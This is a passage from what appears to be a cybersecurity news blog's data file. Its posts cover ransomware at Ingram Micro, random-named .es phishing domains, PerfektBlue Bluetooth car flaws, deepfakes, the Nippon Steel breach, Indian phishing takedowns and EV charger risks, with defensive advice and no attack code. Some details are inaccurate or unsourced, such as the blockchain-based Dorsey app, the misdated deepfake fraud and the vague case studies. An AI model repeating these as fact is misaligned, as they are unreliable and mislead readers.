      <li>✅ Customers are encouraged to contact account managers for the most current updates.</li>
    </ul>

    <h3>⚖️ Why Supply Chains Are Attractive Targets</h3><br>
    <p>Supply chain hubs like Ingram Micro are lucrative ransomware targets because they touch thousands of businesses — amplifying the impact and urgency of the attack. By disrupting a critical node in the chain, attackers increase their leverage and the likelihood of ransom payments.</p>

    <p>Similar incidents have previously struck companies like Colonial Pipeline, Maersk, and Kaseya, proving this is a persistent and evolving threat.</p>

    <h3>🧪 How Ransomware Campaigns Typically Work</h3><br>
    <p>Though details of the attack are still emerging, ransomware campaigns often follow this pattern:</p>
    <ul>
      <li>🎣 Initial access via phishing, credential theft, or vulnerable systems.</li>
      <li>🛠️ Lateral movement to compromise critical servers and backups.</li>
      <li>🔒 Deployment of ransomware payload to encrypt files & systems.</li>
      <li>💰 Ransom demand in cryptocurrency in exchange for decryption keys.</li>
    </ul>

    <h3>🔐 Lessons & Recommendations for Customers and Partners</h3><br>
    <p>While Ingram Micro works to restore systems, customers and partners should take these steps:</p>
    <ul>
      <li>🔒 Stay in regular contact with your Ingram Micro representatives for updates.</li>
      <li>📑 Review and validate orders placed just before and after the outage.</li>
      <li>🛑 Be wary of phishing emails posing as Ingram Micro during recovery efforts.</li>
      <li>💼 Assess your own business continuity & disaster recovery plans to handle supplier disruptions.</li>
      <li>🌐 Consider diversifying critical suppliers where possible to reduce dependency risks.</li>
    </ul>

    <h3>🌟 Final Thoughts</h3><br>
    <p>The Ingram Micro ransomware incident is a stark reminder of the fragility of interconnected supply chains and the immense cost of insufficient cyber resilience. Protecting critical suppliers — and holding them to high security standards — is no longer optional but essential for business continuity.</p>

    <p>As attackers continue to exploit high-value nodes in global networks, organizations must prepare for not just direct attacks but also collateral damage from breaches in their ecosystem.</p>

    <blockquote>💻 In supply chains, you’re only as strong as your weakest link. Stay vigilant, diversify risk, and build resilience before the next attack hits.</blockquote>
  `},{id:"malicious-es-domains-cloudflare",title:"Malicious .es Domains Surge: Hosted on Cloudflare, Random Names Help Defenders Spot Them",date:"2025-07-10",author:"Ethical Byte",summary:"Researchers report a 19× rise in malicious .es domains hosted on Cloudflare, using randomly generated names for phishing — which ironically makes them easier to detect.",tags:[".es domains","phishing","cloudflare","malware","domain security","tld threats"],imageKey:"maliciousEsDomains",content:`
    <h3>🌐 Malicious .es Domains on the Rise</h3><br>
    <p>According to a July 2025 report from <strong>Cofense</strong>, security researchers have detected a sharp <strong>19× increase</strong> in malicious domains using Spain’s country-code TLD (<strong>.es</strong>) over the past six months.</p>

    <p>Nearly all of these domains were hosted via <strong>Cloudflare</strong>, which attackers exploit for its fast content delivery, global reach, and masking capabilities. But while this makes the campaigns effective, it also leaves behind clues defenders can use.</p>

    <h3>🕵️ What Makes These Domains Suspicious?</h3><br>
    <p>Researchers noticed that these malicious domains featured <strong>machine-generated, random-looking subdomain names</strong> — nonsensical strings of characters that are highly unlikely to belong to legitimate Spanish businesses.</p>

    <p>Examples include domains like:</p>
    <ul>
      <li>ag7sr.fjlabpkgcuo.es</li>
      <li>f9bxk.ztrmqvyheso.es</li>
      <li>qx1jp.lkhdxvenbty.es</li>
    </ul>

    <p>These names are generated automatically so attackers can spin up thousands of unique domains rapidly and bypass traditional blocklists.</p>

    <h3>⚠️ Why It Matters</h3><br>
    <ul>
      <li>🚩 Random names help attackers evade blocklists but also make them stand out to defenders.</li>
      <li>🌍 Many phishing campaigns spoof well-known brands but use meaningless domains, which savvy users and tools can catch.</li>
      <li>🔓 Hosting on Cloudflare provides attackers with anonymity and performance, but defenders can monitor .es TLD traffic for anomalies.</li>
    </ul>

    <h3>📧 How Are These Domains Used?</h3><br>
    <p>The vast majority of these domains are used for <strong>credential phishing campaigns</strong> targeting major global brands. Cofense’s analysis showed:</p>
    <ul>
      <li>Microsoft — spoofed in 95% of observed campaigns</li>
      <li>Adobe</li>
      <li>Google</li>
      <li>DocuSign</li>
      <li>U.S. Social Security Administration</li>
    </ul>

    <p>Beyond phishing, a smaller number of domains delivered malware, including Remote Access Trojans (RATs) like <strong>XWorm</strong>, <strong>Dark Crystal</strong>, and <strong>ConnectWise</strong>.</p>

    <h3>🔐 What Can Defenders Do?</h3><br>
    <p>Fortunately, the randomness of these domains provides a useful detection opportunity. Defenders are encouraged to:</p>
    <ul>
      <li>✅ Implement domain heuristics to detect and block nonsensical, random-looking names.</li>
      <li>✅ Actively monitor .es TLD traffic, even if your organization doesn’t have Spanish operations.</li>
      <li>✅ Be wary of domains hosted on Cloudflare with no branding or clear ownership.</li>
      <li>✅ Educate employees about phishing tactics, especially those spoofing major brands.</li>
    </ul>

    <h3>📊 Example Pattern of Suspicious Domains</h3><br>
    <p>Below are examples of the kinds of domains flagged by researchers:</p>
    <ul>
      <li>ag7sr.fjlabpkgcuo.es</li>
      <li>r4ykp.hdlmcxzqjvo.es</li>
      <li>j2kxl.ptnvhwyeqrz.es</li>
    </ul>

    <p>Note the meaningless subdomains and their use of .es — patterns defenders can use to build detection rules.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>Attackers will continue innovating, but sometimes their automation creates obvious patterns. These .es domains are a perfect example: randomized names intended to evade blocklists actually make them <strong>easier for defenders to flag</strong>.</p>

    <blockquote>🌐 Stay vigilant. Look beyond the TLD — focus on patterns and anomalies that attackers can’t hide.</blockquote>
  `},{id:"perfektblue-bluetooth-car-hacking",title:"PerfektBlue Attack Exposes Millions of Connected Vehicles to Remote Bluetooth Hacking",date:"2025-07-11",author:"Ethical Byte",summary:"Critical vulnerabilities in a popular Bluetooth stack expose millions of vehicles to remote hacking. Here’s everything you need to know about PerfektBlue and how to protect yourself.",tags:["perfektblue","bluetooth","car hacking","automotive cybersecurity","openskynergy","iot security"],imageKey:"perfektBlueCarHack",content:`
    <h3>🚗 PerfektBlue: A New Threat to Connected Vehicles</h3><br>
    <p>On July 11, researchers uncovered a set of critical vulnerabilities in <strong>OpenSynergy’s Blue SDK</strong> — a Bluetooth protocol stack integrated into millions of connected vehicles around the world. This attack, named <strong>PerfektBlue</strong>, highlights how attackers can exploit flaws in the car’s wireless interface to gain control without even touching it.</p>

    <h3>🪲 What Happened?</h3><br>
    <p>The vulnerabilities lie in the way Blue SDK processes certain malformed Bluetooth packets. Attackers within wireless range can craft malicious packets to crash the Bluetooth stack or gain control over the car’s infotainment and diagnostic systems — potentially even affecting safety-critical components.</p>

    <p>This means attackers can:</p>
    <ul>
      <li>🎙️ Eavesdrop on conversations or data transmissions.</li>
      <li>🖥️ Inject malicious code into vehicle systems.</li>
      <li>⚠️ Manipulate driver-assist features or disable alerts.</li>
    </ul>

    <h3>📡 Why It Matters</h3><br>
    <p>Modern vehicles are essentially mobile computers — and Bluetooth is a key interface for drivers to connect their devices. With PerfektBlue, attackers can bypass physical security measures entirely, attacking cars wirelessly from a parking lot, street, or even another vehicle.</p>

    <p>Such attacks could expose personal data, interfere with driving, or serve as a stepping stone for further compromises — a significant risk as cars become increasingly autonomous and connected.</p>

    <h3>🧪 How Does the Attack Work?</h3><br>
    <p>The flaw comes from improper validation of malformed or malicious Bluetooth messages by the Blue SDK. Attackers use a laptop and a Bluetooth antenna to craft packets that exploit these flaws, leading to:</p>
    <ul>
      <li>🚫 Denial of service (crashing the stack).</li>
      <li>📥 Remote code execution inside the vehicle’s systems.</li>
    </ul>

    <p>Since Bluetooth has a limited range, attackers must be within tens of meters — but in crowded urban areas or parking structures, that’s trivial to achieve.</p>

    <h3>🛞 Who’s Affected?</h3><br>
    <ul>
      <li>✅ Vehicles from multiple, yet-unnamed manufacturers that use OpenSynergy’s Blue SDK.</li>
      <li>✅ Infotainment units and possibly other IoT devices built with the same stack.</li>
    </ul>

    <p>Researchers have notified OpenSynergy, which is preparing and distributing patches to automakers and vendors.</p>

    <h3>🚨 Real-World Scenario</h3><br>
    <p>Picture this: you park your car at a mall. A hacker nearby scans for vulnerable vehicles. They send crafted Bluetooth packets to your car, crashing its infotainment system, stealing contact lists, or disabling driver-assist warnings — all without touching the car. PerfektBlue turns a harmless convenience into a dangerous backdoor.</p>

    <h3>🔧 What You Should Do</h3><br>
    <p><strong>For Automakers & Suppliers:</strong></p>
    <ul>
      <li>✅ Deploy OpenSynergy’s firmware updates as soon as available.</li>
      <li>✅ Inform customers about risks and patch timelines transparently.</li>
      <li>✅ Audit current vehicle configurations for Bluetooth security posture.</li>
    </ul>

    <p><strong>For Drivers:</strong></p>
    <ul>
      <li>📱 Contact your dealer/service center and ask about software updates.</li>
      <li>🔒 Turn off Bluetooth when not in use to minimize exposure.</li>
      <li>🚨 Pay attention to strange behavior in your infotainment or safety systems and report it.</li>
    </ul>

    <p><strong>For Security Teams:</strong></p>
    <ul>
      <li>🧪 Test all patches thoroughly before rollout.</li>
      <li>📡 Monitor for suspicious Bluetooth activity in parking lots and corporate facilities.</li>
      <li>🔬 Regularly review and harden your fleet’s wireless configurations.</li>
    </ul>

    <h3>🌟 Key Lessons</h3><br>
    <p>The PerfektBlue attack reminds us that every connected feature comes with risk. Cars, like smartphones and laptops, need constant vigilance and updates to stay secure. Bluetooth is convenient, but also a gateway — and attackers are watching.</p>

    <blockquote>🚗 Treat your car like your phone: every wireless connection is a potential door. Make sure you’re the only one holding the keys.</blockquote>
  `},{id:"cyber-talk-july",title:"Join Us for Cyber Talk 2025 – Your Questions, Answered!",date:"2025-07-12",author:"Team EthicalByte",summary:"A live, interactive cybersecurity event hosted by EthicalByte’s CEO , COO & CTO, where we decode trends, certifications, tools, and career paths in cyber. Register now and take the first step toward your future in cybersecurity.",tags:["event","cybersecurity career","certifications","ethicalbyte","future of cybersecurity"],imageKey:"cyberTalk2025Banner",content:`
    <div style="background-color:#f5f7fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      <h3 style="color:#1e2f48;margin-top:0;">🚨 <br> Cyber Talk 2025 <br>Live Cybersecurity Career Event</h3><br>
      <p><strong>Hosted by:</strong> EthicalByte CEO, COO & CTO</p>
      <p><strong>Date:</strong> July 12, 2025</p>
      <p><strong>Format:</strong> Virtual + Interactive Q&A</p>
      <p>Whether you're a beginner or already exploring the cybersecurity space, this event is designed to give you clarity, direction, and insider knowledge on how to grow in cybersecurity in 2026 and beyond.</p>
      
      <div style="text-align:center; margin: 20px 0;">
        <a href="https://tally.so/r/3j4aN1" target="_blank" style="background:#2563eb;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;display:inline-block;">📩 Register Now</a>
      </div>
      
      <h3>📌 What We’ll Cover</h3><br>
      <ul>
        <li><strong>Do you need cybersecurity certifications?</strong> Which ones actually matter in 2026?</li>
        <li><strong>Should you pursue a degree in cybersecurity?</strong> Pros, cons, and alternatives.</li>
        <li><strong>What should you learn first?</strong> Tools, skills, and the right mindset for beginners.</li>
        <li><strong>Is coding required?</strong> What domains need it—and which don’t.</li>
        <li><strong>Building a home lab:</strong> Tools, platforms, and legal hacking practice.</li>
        <li><strong>How to land your first job or internship?</strong> Resume tips, portfolio advice, and where to apply.</li>
        <li><strong>Specialist or generalist?</strong> Choosing your cybersecurity path smartly.</li>
      </ul>

      <h3>🎙️ Expert Panel</h3><br>
      <p>This session will be hosted by our <strong>CEO</strong> and <strong>CTO , COO</strong> who bring years of industry knowledge, startup experience, and mentorship insights. Expect practical advice—not just theory.</p>

      <h3>🛠️ Interactive Q&A</h3><br>
      <p>Ask anything! We’ll be answering live questions from the audience. Whether it’s about hacking tools, certifications, lab setup, or career doubts—this is your chance to ask directly.</p>

      <h3>🎯 Who Should Attend?</h3><br>
      <ul>
        <li>College students exploring cybersecurity</li>
        <li>Beginners who want to enter the field in 2026</li>
        <li>Professionals looking to upskill or switch careers</li>
        <li>Anyone curious about certifications, hacking tools, or job preparation</li>
      </ul>

      <h3>🚀 Why Attend?</h3><br>
      <p>This is not just a session—it’s a career starter. Real strategies. Real clarity. From real experts. Let EthicalByte help you plan your journey into the world of cybersecurity.</p>

      <div style="margin-top:30px;text-align:center;">
        <a href="https://tally.so/r/3j4aN1" target="_blank" style="background:#007bff;color:#fff;padding:14px 28px;border-radius:8px;text-decoration:none;font-size:16px;font-weight:bold;">🚀 Secure Your Seat</a>
      </div>
    </div>
  `},{id:"rise-of-deepfake-attacks",title:"The Rise of Deepfake Attacks: A Growing Cybersecurity Nightmare",date:"2025-07-11",author:"Harshit Agarwal & Dr. Neetha S.S",summary:"Deepfakes have evolved from harmless fun to a dangerous cyber threat undermining trust itself. This blog explores how deepfake attacks work, real-world examples, and how individuals & organizations can defend against them.",tags:["deepfake","cybersecurity","AI threats","trust","Christ University"],imageKey:"deepfakeThreatBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <h3>When AI Becomes a Weapon: The New Reality of Deepfake Attacks</h3><br>
      <p>Deepfakes started as a novelty—funny memes, celebrity face swaps, or creative videos. But those days of innocent entertainment are gone. Today, deepfake technology has evolved into a sophisticated weapon in the hands of cybercriminals, capable of causing reputational, financial, and even geopolitical damage.</p>
      
      <p>Unlike traditional cyber threats that target systems and data, deepfakes target something far more valuable: <strong>trust</strong>. If you can’t believe what you see or hear, human communication itself starts to crumble. With the rapid evolution of AI, these attacks are becoming more frequent, convincing, and dangerous.</p>
      
      <h3>Anatomy of a Deepfake Attack</h3><br>
      <p>Picture this: you’re a finance manager, and you receive a video call from your CEO urgently asking to transfer ₹4 crores to a vendor. The voice, the face — everything seems authentic, but something feels … off. Welcome to the new era of CEO fraud, powered by deepfakes.</p>
      
      <p>Deepfakes use AI to craft hyper-realistic audio and video, indistinguishable from reality to the untrained eye. Here are some ways cybercriminals exploit this technology:</p>
      <ul>
        <li><strong>CEO Fraud 2.0:</strong> Instead of spoofed emails, attackers now create convincing video calls requesting urgent fund transfers.</li>
        <li><strong>Disinformation Avalanche:</strong> Fake videos manipulate stock prices, sway elections, and damage reputations in hours.</li>
        <li><strong>Identity Theft on Steroids:</strong> Synthetic videos of individuals are used for blackmail, fraud, or harassment.</li>
        <li><strong>The Revenge Factor:</strong> Personal vendettas turn digital with deepfake-driven harassment and psychological trauma.</li>
      </ul>

      <p>In 2023, a major energy company lost over $240,000 after a deepfake audio of their CFO was used to convince an employee to authorize a transfer. Similar attacks have targeted political campaigns, celebrities, and even journalists—showing how no one is immune.</p>

      <h3>The Science Behind the Deception</h3><br>
      <p>At the core of deepfakes lie <strong>Generative Adversarial Networks (GANs)</strong> — two AI systems in constant battle. One generates fake content while the other tries to detect it, improving each iteration until the fake becomes indistinguishable from reality. This adversarial training process makes deepfakes more sophisticated with each generation.</p>
      
      <p>This technology, once confined to research labs, is now easily accessible through open-source software and even mobile apps. With just a smartphone and some creativity, anyone can create a deepfake convincing enough to deceive colleagues, clients, and even family members.</p>

      <h3>Why Are Deepfakes So Effective?</h3><br>
      <p>Humans are hardwired to trust their senses. Seeing is believing—or so we thought. Deepfakes exploit this cognitive bias, creating an emotional response before critical thinking kicks in. Moreover, in moments of urgency—like financial requests or crises—victims are less likely to pause and verify authenticity.</p>

      <p>This psychological manipulation makes deepfakes not just a technical challenge, but a human one too.</p>

      <h3>Fighting Fire with Fire: How to Defend Against Deepfakes</h3><br>
      <p>While deepfakes are advancing rapidly, so are our defense mechanisms. Here are actionable strategies:</p>

      <h3>1️⃣ Train Your Human Firewall</h3><br>
      <ul>
        <li><strong>Trust but Verify:</strong> Institute mandatory verification protocols for financial and sensitive requests.</li>
        <li><strong>Spot the Signs:</strong> Look for unnatural blinking, inconsistent lighting, poor lip-syncing, robotic audio—these are common giveaways.</li>
        <li><strong>Conduct Deepfake Drills:</strong> Make security training engaging and realistic by simulating deepfake scenarios.</li>
      </ul>

      <h3>2️⃣ Deploy the Tech Arsenal</h3><br>
      <ul>
        <li><strong>Watermarking:</strong> Embed invisible digital fingerprints in authentic content to verify originality.</li>
        <li><strong>AI vs. AI:</strong> Use AI tools that analyze pixel-level anomalies and voiceprint patterns to detect deepfakes.</li>
        <li><strong>Next-Gen Biometrics:</strong> Move beyond facial recognition to heartbeat patterns, breathing analysis, and subtle micro-expressions.</li>
      </ul>

      <h3>3️⃣ Build a Security-First Culture</h3><br>
      <ul>
        <li>Encourage skepticism without fostering fear.</li>
        <li>Use multiple communication channels for critical decisions—don’t rely solely on video or audio.</li>
        <li>Stay informed about the latest deepfake trends and detection tools.</li>
      </ul>

      <h3>The Road Ahead: A Personal Reflection</h3><br>
      <p>Deepfakes challenge a fundamental human assumption: that our senses don’t lie. But like any disruptive technology, they bring both risks and opportunities. With awareness, education, and the right tools, we can turn the tide.</p>
      
      <p>We must remain vigilant without succumbing to paranoia, skeptical yet humane, and harness technology to defend rather than fear. In the battle between authentic human connection and artificial deception, we still have the upper hand—if we’re smart and proactive about it.</p>

      <h3>Real-World Case Study: The Power of a Single Deepfake</h3><br>
      <p>In 2024, a fabricated video of a political leader making inflammatory statements went viral overnight, sparking protests and a temporary market crash. Analysts later confirmed it was a deepfake—but the damage was already done. This illustrates the urgency of building resilience against such attacks at both individual and institutional levels.</p>

      <h3>About the Authors</h3><br>
      <p><strong>Harshit Agarwal</strong> is a BCA student at Christ University with a focus on cybersecurity and emerging digital threats.</p>
      <p><strong>Dr. Neetha S.S</strong> is an Assistant Professor of Computer Science at Christ University, specializing in cybersecurity, AI, and digital forensics. Together, they bring academic insight and fresh perspective into the growing menace of deepfakes.</p>
    </div>
  `},{id:"nippon-steel-zero-day",title:"Nippon Steel Confirms Zero-Day Attack Exposed Sensitive Data",date:"2025-07-12",author:"EthicalByte",summary:"Japan’s largest steelmaker, Nippon Steel, suffered a sophisticated zero-day cyberattack that exposed business partner, customer, and employee information. This incident underscores the vulnerability of industrial giants to advanced threats.",tags:["zero-day","nippon steel","manufacturing security","data breach","industrial cybersecurity"],imageKey:"nipponSteelBreachBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <h3>🔍 <br> Cybersecurity Incident: Nippon Steel Hit by Zero-Day Attack</h3><br>
      <p>In a stark reminder that no organization is immune, <strong>Nippon Steel</strong>, Japan’s largest steelmaker and a cornerstone of global manufacturing, confirmed it fell victim to a sophisticated <strong>zero-day cyberattack</strong>. The breach resulted in unauthorized access to sensitive data — a wake-up call for industries worldwide.</p>

      <h3>What Happened?</h3><br>
      <p>According to the company’s disclosure:</p>
      <ul>
        <li>Attackers exploited a previously unknown <strong>zero-day vulnerability</strong> in one of Nippon Steel’s internal systems.</li>
        <li>They gained <strong>unauthorized access</strong> to three major categories of data:</li>
        <ul>
          <li>📁 Business partner information</li>
          <li>👥 Customer records</li>
          <li>👤 Employee data</li>
        </ul>
        <li>The company has not yet revealed which software or system was compromised — likely to avoid tipping off other potential attackers.</li>
      </ul>

      <h3>Why Does This Matter?</h3><br>
      <p>This incident underscores two critical truths:</p>
      <ul>
        <li>⚠️ <strong>Critical infrastructure & manufacturing remain high-value targets</strong> — not just banks and tech companies.</li>
        <li>🕵️ Zero-day exploits — flaws unknown to the vendor & public — are highly effective because no patch exists when attackers strike.</li>
      </ul>
      <p>Such incidents can disrupt supply chains, hurt reputations, and erode trust in industries already under cyber siege.</p>

      <h3>The Impact</h3><br>
      <ul>
        <li>🔓 Leakage of sensitive corporate and personal data, potentially putting individuals and partners at risk of further attacks, fraud, or identity theft.</li>
        <li>📉 Loss of trust among stakeholders — partners and customers may rethink their reliance on Nippon Steel.</li>
        <li>💼 Legal & regulatory scrutiny, especially if personal data protection laws like GDPR or Japan’s APPI were violated.</li>
      </ul>

      <h3>Company’s Response</h3><br>
      <p>Nippon Steel acted promptly after discovering the breach:</p>
      <ul>
        <li>✅ Patched the vulnerability after identifying the exploit path.</li>
        <li>✅ Isolated and secured affected systems to stop further access.</li>
        <li>✅ Launched a forensic investigation with the help of cybersecurity experts and law enforcement agencies.</li>
        <li>✅ Enhanced monitoring to watch for follow-up or lateral movement attacks.</li>
      </ul>
      <p>While these actions are commendable, the incident shows how even proactive companies can be caught off-guard when the attacker has a zero-day in their arsenal.</p>

      <h3>Lessons for Other Organizations</h3><br>
      <p>Even if you’re not a manufacturing giant, the lessons are universal:</p>
      <ul>
        <li>🔍 <strong>Invest in threat intelligence</strong> to detect emerging vulnerabilities quickly.</li>
        <li>🔒 Implement <strong>network segmentation</strong> and <strong>least privilege access</strong> — to limit how much damage a single exploit can cause.</li>
        <li>📝 Audit your supply chain — third-party software and vendors can become the weakest link.</li>
        <li>🧪 Regularly conduct incident response drills — when a real attack hits, every minute counts.</li>
        <li>📊 Maintain transparent communication — keeping stakeholders informed builds trust even during a crisis.</li>
      </ul>

      <h3>Case Studies: Not an Isolated Incident</h3><br>
      <p>Zero-day attacks have hit industrial giants before:</p>
      <ul>
        <li>In 2021, a water treatment plant in Florida was compromised using an unpatched vulnerability.</li>
        <li>In 2023, a zero-day in SCADA software caused downtime at a major automotive plant in Germany.</li>
        <li>Now, Nippon Steel joins this growing list — showing the need for continuous vigilance.</li>
      </ul>

      <h3>Key Takeaway</h3><br>
      <blockquote>🎯 Even industry leaders with robust defenses are vulnerable to zero-day exploits. The battle is not just about having tools, but about staying prepared, informed, and adaptive.</blockquote>

    </div>
  `},{id:"ntro-phishing-domains-2025",title:"NTRO Detects 1,172 Phishing Domains in India",date:"2025-07-13",author:"EthicalByte",summary:"India’s NTRO identified and blocked over 1,172 phishing domains in the first half of 2025, showcasing coordinated efforts to safeguard citizens, businesses, and government from rising phishing threats.",tags:["phishing","ntro","india cybersecurity","threat intelligence","awareness"],imageKey:"ntroPhishingBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">

      <h3>🛡️ Cybersecurity News: NTRO Detects 1,172 Phishing Domains in India</h3><br>
      <p>In a significant move to safeguard India’s digital ecosystem, the <strong>National Technical Research Organisation (NTRO)</strong>, India’s premier technical intelligence agency, has detected and initiated action against <strong>1,172 phishing domains</strong> in just the first six months of 2025. This proactive operation demonstrates the increasing vigilance and capability of Indian cyber defense mechanisms in the face of rising cybercrime.</p>

      <h3>What Happened?</h3><br>
      <ul>
        <li>🇮🇳 NTRO, leveraging its advanced surveillance infrastructure and intelligence gathering, identified 1,172 phishing domains targeting Indian citizens, businesses, and government entities.</li>
        <li>🔎 These domains were designed to steal sensitive data, install malware, and impersonate legitimate organizations to deceive victims.</li>
        <li>📑 The agency briefed the findings to the Parliamentary Standing Committee on Information Technology, explaining the detection strategy and next steps.</li>
      </ul>

      <h3>Why It Matters</h3><br>
      <p>Phishing remains one of the most widely used and effective attack methods by cybercriminals. The NTRO’s findings highlight:</p>
      <ul>
        <li>🎣 The growing sophistication of phishing campaigns that often evade traditional defenses.</li>
        <li>🧲 How attackers exploit human trust — using fake websites, lookalike domains, and urgency tactics.</li>
        <li>🏛️ The vital role of government‑led monitoring to protect critical sectors and citizens from mass exploitation.</li>
      </ul>
      <p>Such operations are crucial not just for blocking attacks in real time, but also for raising awareness about the evolving nature of these threats.</p>

      <h3>NTRO’s Actions</h3><br>
      <ul>
        <li>✅ Flagged and shared the list of malicious domains with telecom operators, hosting providers, and ISPs to ensure prompt blocking.</li>
        <li>✅ Devised a collaborative <strong>matrix approach</strong> that aligns government, private sector, and service providers for faster detection and takedown of threats.</li>
        <li>✅ Ensured continued monitoring and intelligence gathering to stay ahead of emerging phishing campaigns.</li>
      </ul>

      <h3>Recommendations for Users</h3><br>
      <ul>
        <li>🔒 Be wary of unsolicited messages, emails, or SMS requesting personal, financial, or login information.</li>
        <li>🖥️ Always type website URLs manually or use bookmarks instead of clicking links in emails.</li>
        <li>🔧 Enable <strong>multi-factor authentication (MFA)</strong> to protect accounts even if credentials are compromised.</li>
        <li>📣 Report suspicious emails or websites to your organization’s IT/security team or India’s official cybercrime portal.</li>
      </ul>

      <h3>Real‑World Example</h3><br>
      <blockquote>📧 A user receives an email from “income‑tax‑india.co” prompting them to submit their PAN and banking details for a supposed refund. Thanks to NTRO’s early detection, ISPs block access to this domain before the victim can interact, preventing data theft.</blockquote>

      <h3>Looking Ahead</h3><br>
      <p>The NTRO’s initiative sets a benchmark for how public‑private collaboration can proactively counter cyber threats. As phishing tactics evolve — using AI, deepfakes, and more sophisticated lures — the need for vigilance, education, and fast response becomes even more critical. Strengthening awareness at the individual level, while enhancing intelligence at the institutional level, remains key to securing India’s cyberspace.</p>

      <h3>Key Takeaway</h3><br>
      <blockquote>🚀 Phishing is a battle of trust versus deception. NTRO’s proactive detection and blocking of malicious domains protect millions of Indians — and underscore the power of vigilance, collaboration, and preparedness.</blockquote>

    </div>
  `},{id:"ev-charging-vulnerability-2025",title:"Critical EV Charger Flaw: What Drivers and Operators Need to Know",date:"2025-07-14",author:"EthicalByte News Desk",summary:"A major vulnerability in popular EV charging stations has exposed millions of users to risks of outages, fraud, and even grid disruptions. Here’s what happened — and what you can do now.",tags:["EV","cybersecurity","vulnerability","iot security","electric vehicles"],imageKey:"evChargingVulnBanner",content:`
    <div style="background-color:#f9fbfd;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;">
        <h3 style="color:#1e2f48;">⚡ Critical EV Charger Vulnerability Uncovered</h3>
        <p style="font-style:italic;">Millions of drivers at risk. Here’s what happened — and how to stay secure.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">📖 The Story So Far</h4>
        <p>Earlier this week, researchers disclosed a serious security flaw in widely‑used electric vehicle (EV) charging stations. By exploiting weak authentication and poor input validation, attackers could remotely tamper with chargers worldwide. The flaw — now patched — affected multiple brands and models.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚗 What Could Attackers Do?</strong>
        <ul style="margin-top:10px;">
          <li>Disable or shut down entire charging stations, leaving drivers stranded.</li>
          <li>Alter billing records — letting them “charge for free” or overbill users.</li>
          <li>Overload local grids by turning multiple chargers on/off in patterns.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">🔍 How Was It Discovered?</h4>
        <p>A team of cybersecurity researchers conducted a penetration test on public chargers and found they accepted unauthenticated API requests. This allowed remote control of critical functions with minimal effort — essentially leaving chargers exposed to anyone with an internet connection.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">💡 Why This Matters</h4>
        <p>EV adoption is booming — but as cars become smarter, the infrastructure that supports them must also evolve to resist cyber threats. An insecure charger isn’t just inconvenient — it can hurt trust, cost money, and even threaten local electricity stability.</p>
      </section>

      <section style="margin-top:20px;background:#e2f0d9;padding:15px;border-radius:8px;">
        <h4 style="color:#1e7e34;">✅ What Should You Do Now?</h4>
        <ul>
          <li>🔧 Update your charger’s firmware & software immediately — vendors have issued patches.</li>
          <li>🔒 Avoid connecting to chargers via public, unsecured Wi-Fi networks if possible.</li>
          <li>📝 Review recent charging session bills to ensure accuracy.</li>
          <li>📣 Report suspicious charger behavior to the manufacturer or your service provider promptly.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">📋 A Real‑World Example</h4>
        <p>One reported incident involved a fleet of EVs at a corporate parking lot, where chargers were remotely disabled just as employees were leaving for the day. This caused significant delays and showcased how disruptive even short outages can be.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">🚀 Moving Forward</h4>
        <p>This vulnerability reminds us that convenience and security must go hand‑in‑hand. As EV infrastructure grows, so does its appeal to attackers. Building robust security into these systems from the start — and staying vigilant with updates — is the best way to keep the road ahead safe and smooth for everyone.</p>
      </section>

    </div>
  `},{id:"jack-dorsey-messaging-app-2025",title:"Jack Dorsey Launches Blockchain-Based Messaging App Without Internet",date:"2025-07-15",author:"EthicalByte",summary:"Twitter co-founder Jack Dorsey unveiled a decentralized messaging app that works without internet, using blockchain & alternative connectivity to enable communication anywhere.",tags:["blockchain","messaging","decentralized","jack dorsey","innovation"],imageKey:"jackMessagingAppBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📡 Jack Dorsey’s New Messaging App Works Without Internet</h3><br>
        <p style="font-style:italic;">Blockchain + radio waves + satellites = communication, anywhere.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 The Big Reveal</h4><br>
        <p>Jack Dorsey, co-founder of Twitter and a prominent figure in blockchain innovation, has launched a **decentralized messaging app** that doesn’t rely on traditional internet infrastructure. Instead, the app lets users communicate using radio waves, local Wi-Fi, or even satellite links.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚀 What Makes It Special?</strong>
        <ul style="margin-top:10px;">
          <li>Works without internet – perfect for remote areas or during outages.</li>
          <li>Leverages blockchain to ensure decentralization and security.</li>
          <li>Uses radio, Wi-Fi mesh, and satellites for flexible connectivity.</li>
          <li>Bypasses traditional telecom and government censorship.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔗 Why This Matters</h4><br>
        <p>In many parts of the world, access to reliable internet is a privilege — and in some regions, information flow is deliberately restricted. A decentralized messaging platform like this promotes:</p>
        <ul>
          <li>🌍 Uninterrupted communication during natural disasters & crises.</li>
          <li>🕊️ Freedom from censorship & centralized control.</li>
          <li>🤝 Building resilient, local & global communities.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ Who Can Benefit?</h4><br>
        <ul>
          <li>People in rural or underserved areas with no internet coverage.</li>
          <li>Activists & journalists operating in censored regions.</li>
          <li>Emergency responders needing reliable backup communication channels.</li>
          <li>Anyone looking for more privacy & autonomy in digital communication.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛠️ How Does It Work?</h4><br>
